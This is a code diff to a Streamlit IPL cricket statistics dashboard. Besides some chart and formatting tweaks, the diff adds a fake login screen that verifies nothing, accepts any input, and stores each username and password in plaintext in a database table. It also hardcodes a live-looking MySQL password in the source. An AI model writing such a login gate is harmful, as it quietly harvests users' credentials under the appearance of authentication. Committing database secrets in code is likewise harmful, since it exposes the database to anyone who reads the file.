@@ -1,6 +1,48 @@
 import streamlit as st
 import pandas as pd
 import plotly.express as px
+import mysql.connector
+
+# -------------------------------
+# CONNECT TO RAILWAY MYSQL
+# -------------------------------
+conn = mysql.connector.connect(
+    host="mysql.railway.internal",   # replace with your Railway host
+    user="root",                        # replace with your Railway user
+    password="LOfnlnEOuUJwwkSWfYUuprcxFFadKxyk",               # replace with your Railway password
+    database="railway"                  # replace with your Railway database
+)
+cursor = conn.cursor()
+
+# -------------------------------
+# SIMPLE LOGIN SYSTEM
+# -------------------------------
+if "logged_in" not in st.session_state:
+    st.session_state.logged_in = False
+
+if not st.session_state.logged_in:
+    st.title("🔐 Login Required")
+    username = st.text_input("username")
+    password = st.text_input("password", type="password")
+    
+    if st.button("Login"):
+        if username and password:
+            # Insert login into MySQL
+            cursor.execute(
+                "INSERT INTO login_logs (username, password) VALUES (%s, %s)",
+                (username, password)
+            )
+            conn.commit()
+            st.session_state.logged_in = True
+            st.success("Login successful! Reload the page to continue.")
+        else:
+            st.error("Please enter both username and password")
+    
+    st.stop()  # Stop the rest of the app until login
+
+# -------------------------------
+# DASHBOARD STARTS HERE
+# -------------------------------
 
 # ---------- Page Setup ----------
 st.set_page_config(page_title="IPL Data Analysis Dashboard", layout="centered")
@@ -31,7 +73,7 @@ with col2:
         unsafe_allow_html=True
     )
 
-# ---------- Load Data (Simple Version) ----------
+# ---------- Load Data ----------
 matches_url = "https://drive.google.com/uc?export=download&id=1ZCqwqbFRHdwHTCO4LWQezWB99LfynPJB"
 deliveries_url = "https://drive.google.com/uc?export=download&id=1kQXChtwZxkYrbzvVY5k4s-ffs6dVCVXK"
 
@@ -54,10 +96,10 @@ col3.markdown(f"🏟️ **Unique Stadiums**: {matches['venue'].nunique()}")
 option = st.selectbox(
     "Choose analysis:",
     ["Select...", "Top 5 Teams", "Top Batsmen", "Top Stadiums",
-     "Top Bowlers", "Most Sixes", "Most Fours", "Matches by City","Most Toss Wins"]
+     "Top Bowlers", "Most Sixes", "Most Fours", "Matches by City", "Most Toss Wins"]
 )
 
-# ---------- Display Analysis Based on Selection ----------
+# ---------- Display Analysis ----------
 if option == "Top 5 Teams":
     team_wins = matches['winner'].value_counts().head(5).reset_index()
     team_wins.columns = ['Team', 'Wins']
@@ -104,19 +146,16 @@ elif option == "Matches by City":
     fig = px.pie(city_count, names='City', values='Matches',
                  title="🗺️ Matches Hosted per City")
     st.plotly_chart(fig, use_container_width=True)
-    
+
 elif option == "Most Toss Wins":
     toss_wins = matches['toss_winner'].value_counts().head(10).reset_index()
     toss_wins.columns = ['Team', 'Toss Wins']
+    fig = px.bar(toss_wins, x='Toss Wins', y='Team',
+                 orientation='h', color='Toss Wins', text='Toss Wins',
+                 title="🪙 Most Toss Wins", color_continuous_scale='Blues')
 
-    fig = px.bar(
-        toss_wins, x='Toss Wins', y='Team',
-        orientation='h', color='Toss Wins',
-        text='Toss Wins',
-        title="🪙 Most Toss Wins",
-        color_continuous_scale='Blues'
-    )
     st.plotly_chart(fig, use_container_width=True)
+
 elif option == "Top Bowlers":
     if 'player_dismissed' in deliveries.columns and 'bowler' in deliveries.columns:
         wickets = (deliveries[deliveries['player_dismissed'].notnull()]
@@ -126,7 +165,4 @@ elif option == "Top Bowlers":
                      text='Wickets', color_continuous_scale='Agsunset')
         st.plotly_chart(fig, use_container_width=True)
     else:
-        st.warning("⚠️ Deliveries dataset missing required columns for bowlers.") 
-
-
-
+        st.warning("⚠️ Deliveries dataset missing required columns for bowlers.")
